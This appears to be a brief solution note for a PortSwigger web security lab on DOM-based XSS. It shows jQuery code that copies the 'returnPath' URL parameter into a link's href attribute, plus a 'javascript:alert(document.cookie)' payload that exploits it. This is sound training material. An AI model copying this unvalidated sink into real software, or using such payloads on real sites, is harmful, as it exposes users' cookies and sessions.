# [DOM XSS: jQuery Anchor `href` Attribute Sink Using `location.search` Source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

Vulnerable:

```javascript
$(function() {
  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Payload: `/feedback?returnPath=javascript:alert(document.cookie)`